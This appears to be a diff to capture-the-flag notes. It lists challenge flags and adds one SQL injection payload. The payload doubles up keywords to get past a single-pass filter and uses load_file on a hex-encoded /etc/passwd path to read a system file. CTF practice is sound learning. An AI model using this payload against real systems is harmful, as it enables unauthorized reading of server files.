@@ -6,3 +6,6 @@ FLAG{filtering_union_once_leaves_uunionnion_intact}
 FLAG-is_this_sqli_or_lfi
 FLAG{professor_trusts_his_student_too_much}
 
+
+
+``` -1/**/uunionnion/**/selselectect/**/lload_fileoad_file(0x2f6574632f706173737764)/**/AS/**/text ```
